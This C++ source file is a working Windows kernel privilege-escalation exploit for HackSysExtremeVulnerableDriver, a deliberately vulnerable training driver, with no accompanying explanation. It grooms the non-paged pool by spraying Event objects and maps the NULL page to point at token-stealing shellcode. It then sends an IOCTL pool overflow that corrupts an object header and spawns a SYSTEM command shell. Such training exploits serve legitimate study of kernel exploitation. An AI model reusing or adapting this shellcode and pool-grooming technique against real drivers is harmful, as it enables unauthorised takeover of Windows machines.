#include <stdio.h>
#include <Windows.h>
#include <sddl.h>
#include <vector>
#include <Psapi.h>
#include <winnt.h>

#define IOCTL(Function) CTL_CODE(FILE_DEVICE_UNKNOWN, Function, METHOD_NEITHER, FILE_ANY_ACCESS)
#define HEVD_IOCTL_BUFFER_OVERFLOW_NON_PAGED_POOL IOCTL(0x803)

using namespace std;

vector<HANDLE> defragment_handles;
vector<HANDLE> sequential_handles;

#define FILEMAP_SIZE 4096
#define BUF_SIZE 532

typedef NTSTATUS(WINAPI* _NtAllocateVirtualMemory)(
    HANDLE ProcessHandle,
    PVOID* BaseAddress,
    ULONG_PTR ZeroBits,
    PSIZE_T AllocationSize,
    ULONG AllocationType,
    ULONG Protect
    );

HANDLE create_handle() {
    HANDLE driverHandle;

    printf("[*] Opening handle to \\\\.\\HackSysExtremeVulnerableDriver\n");

    driverHandle = CreateFileA(
        "\\\\.\\HackSysExtremeVulnerableDriver",
        GENERIC_READ | GENERIC_WRITE,
        0,
        NULL,
        OPEN_EXISTING,
        FILE_ATTRIBUTE_NORMAL,
        NULL
    );
    if (driverHandle == INVALID_HANDLE_VALUE) {
        printf("\t[-] Could not open HEVD handle\n");
        return 0;
    }
    printf("\t[+] Success to open handle\n");

    return driverHandle;
}

LPVOID kernelBase() {

    printf("[*] Preparing kernel information leak\n");

    LPVOID drivers[1000];
    DWORD cbNeeded;

    EnumDeviceDrivers(drivers, 1000, &cbNeeded);
    LPVOID kernelBaseAddr = drivers[0];
    printf("\t[+] Kernel base address @  0x%p\n", kernelBaseAddr);

    return kernelBaseAddr;
}

int main() {
    HANDLE driverHandle;
    LPVOID lpvPayload;

    driverHandle = create_handle();

    /* spray */
    //vector<HANDLE> defragment_handles;
    //vector<HANDLE> sequential_handles;

    printf("[*] Spraying pool to defragment...\n");
    for (int i = 0; i < 100000; i++) {
        HANDLE result = CreateEvent(NULL,
            0,
            0,
            L"");

        if (!result) {
            printf("\t[-] Error allocating Event Object during defragmentation\n");
            exit(1);
        }

        defragment_handles.push_back(result);
    }
    printf("\t[+] Defragmentation spray complete.\n");
    printf("[*] Spraying sequential allocations...\n");
    for (int i = 0; i < 100000; i++) {

        HANDLE result = CreateEvent(NULL,
            0,
            0,
            L"");

        if (!result) {
            printf("\t[-] Error allocating Event Object during sequential.\n");
            exit(1);
        }

        sequential_handles.push_back(result);
    }

    printf("\t[+] Sequential spray complete.\n");

    printf("[*] Poking 0x200 byte-sized holes in our sequential allocation...\n");
    for (int i = 0; i < sequential_handles.size(); i = i + 0x16) {
        for (int x = 0; x < 8; x++) {
            BOOL freed = CloseHandle(sequential_handles[i + x]);
            if (freed == false) {
                printf("\t[-] Unable to free sequential allocation!\n");
            }
        }
    }
    printf("\t[+] Holes poked.\n");

    LPVOID kernelBaseAddr = kernelBase();

    // alloc shellcode
    printf("[*] prepare shellcode\n");

    char shellcode[67] = (
        "\xCC"
        "\x60" // PUSHAD
        "\x64\xA1\x24\x01\x00\x00" // MOV EAX, fs:[KTHREAD_OFFSET]
        "\x8B\x40\x50" // MOV EAX, [EAX + EPROCESS_OFFSET]
        "\x89\xC1" // mov ecx, eax (Current EPROCESS structure)
        "\x8B\x98\xF8\x00\x00\x00" // mov ebx, [eax + TOKEN_OFFSET]
                                   
        "\xBA\x04\x00\x00\x00" // mov edx, 4 (SYSTEM PID)
        "\x8B\x80\xB8\x00\x00\x00" // mov eax, [eax + FLINK_OFFSET]
        "\x2D\xB8\x00\x00\x00" //               sub eax, FLINK_OFFSET 
        "\x39\x90\xB4\x00\x00\x00" //      cmp[eax + PID_OFFSET], edx 
        "\x75\xED" // jnz                                          
        "\x8B\x90\xF8\x00\x00\x00" // mov edx, [eax + TOKEN_OFFSET]
        "\x89\x91\xF8\x00\x00\x00" // mov[ecx + TOKEN_OFFSET], edx

        "\x61" // popad
        "\xC2\x04\x00" // RET 0x4
        );
    LPVOID shellcode_addr = VirtualAlloc(NULL,
        sizeof(shellcode),
        MEM_COMMIT | MEM_RESERVE,
        PAGE_EXECUTE_READWRITE);

    memcpy(shellcode_addr, shellcode, sizeof(shellcode));

    _NtAllocateVirtualMemory NtAllocateVirtualMemory =
        (_NtAllocateVirtualMemory)GetProcAddress(GetModuleHandleA("ntdll.dll"),
            "NtAllocateVirtualMemory");

    INT64 address = 0x1;
    int size = 0x100;

    HANDLE result = (HANDLE)NtAllocateVirtualMemory(
        GetCurrentProcess(),
        (PVOID*)&address,
        NULL,
        (PSIZE_T)&size,
        MEM_COMMIT | MEM_RESERVE,
        PAGE_EXECUTE_READWRITE);

    if (result == INVALID_HANDLE_VALUE) {
        printf("\t[-] Unable to allocate NULL page\n");
        exit(1);
    }
    memset((void*)0x0, '\x00', 0x100);
    memcpy((void*)0x60, (void*)&shellcode_addr, 0x4);
    printf("\t[+] NULL page mapped.\n");


    printf("[*] Preparing buf\n");

    ULONG payload_len = 0x1F8;

    BYTE* input_buff = (BYTE*)VirtualAlloc(NULL,
        payload_len + 0x1,
        MEM_RESERVE | MEM_COMMIT,
        PAGE_EXECUTE_READWRITE);

    BYTE overwrite_payload[] = (
        "\x40\x00\x08\x04"  // pool header
        "\x45\x76\x65\xee"  // pool tag
        "\x00\x00\x00\x00"  // obj header quota begin
        "\x40\x00\x00\x00"
        "\x00\x00\x00\x00"
        "\x00\x00\x00\x00"  // obj header quota end
        "\x01\x00\x00\x00"  // obj header begin
        "\x01\x00\x00\x00"
        "\x00\x00\x00\x00"
        "\x00\x00\x08\x00" // 0xc converted to 0x0
        );

    memset(input_buff, '\x42', payload_len);
    memcpy(input_buff + 0x1F8, overwrite_payload, 0x28);

    DWORD bytes_ret = 0;

    printf("[*] Send payload\n");
    if (!DeviceIoControl(driverHandle, HEVD_IOCTL_BUFFER_OVERFLOW_NON_PAGED_POOL, input_buff, 0x220, NULL, 0, &bytes_ret, NULL)) {
        printf("\t[-] Error sending IOCTL to driver\n");
        return 0;
    }

    printf("[*] Freeing defragmentation allocations...\n");
    for (int i = 0; i < defragment_handles.size(); i++) {

        BOOL freed = CloseHandle(defragment_handles[i]);
        if (freed == false) {
            printf("\t[-] Unable to free defragment allocation!\n");
            exit(1);
        }
    }
    printf("\t[+] Defragmentation allocations freed.\n");

    printf("[*] Freeing sequential allocations...\n");
    for (int i = 8; i < sequential_handles.size()-0x16; i = i + 0x16) {
        for (int x = 0; x < 8; x++) {
            BOOL freed = CloseHandle(sequential_handles[i + x]);
            if (freed == false) {
                printf("\t[-] Unable to free sequential allocation!\n");
            }
        }
    }
    for (int i = 0; i < sequential_handles.size(); i++) {

        BOOL freed = CloseHandle(sequential_handles[i]);
        if (freed == false) {
            //printf("\t[-] Unable to free sequential allocation!\n");
            //exit(1);
        }
    }
    printf("\t[+] Sequential allocations freed.\n");


    printf("\t[+] Success\n");
    system("cmd.exe");
}
